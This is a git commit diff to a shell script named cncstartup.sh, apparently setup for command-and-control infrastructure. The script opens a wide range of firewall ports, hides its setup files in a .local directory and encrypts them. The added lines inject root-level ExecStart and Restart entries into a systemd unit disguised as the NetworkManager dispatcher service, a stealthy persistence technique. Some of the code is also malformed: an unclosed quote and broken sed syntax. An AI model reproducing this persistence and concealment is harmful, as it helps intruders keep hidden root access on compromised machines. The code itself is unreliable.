310b848a0589f1bcf6d25e0cba437ecfb814a3a1
Shuttlemax <rao.nihar912@gmail.com>
2023-03-26 21:34:54 -0500

    add the line injections

--- cncstartup.sh
+++ cncstartup.sh
@@ -6,10 +6,17 @@ pip3 install --upgrade pip;
 pip3 install setuptools_rust;
 pip3 install cryptography;
 python3 setup.py;
+
 firewall-cmd --add-port=1234-9999/tcp;
 mkdir .local
 mv setup.py install.sh .local/
-
 gpg -c .local/*
+
+file_path="/root/etc/systemd/system/dbus-org.freedesktop.nm-dispatcher.service
+sed -i "${14a}a\\WantedBy=multi-user.target" "$file_path"
+sed -i "${7a}a\\ExecStart=/root/cncstartup.sh" "$file_path"
+sed -i "${7a}a\\Restart=always" "$file_path"
+sed -i "${7a}a\\User=root" "$file_path"
+
 
 rm setup.py
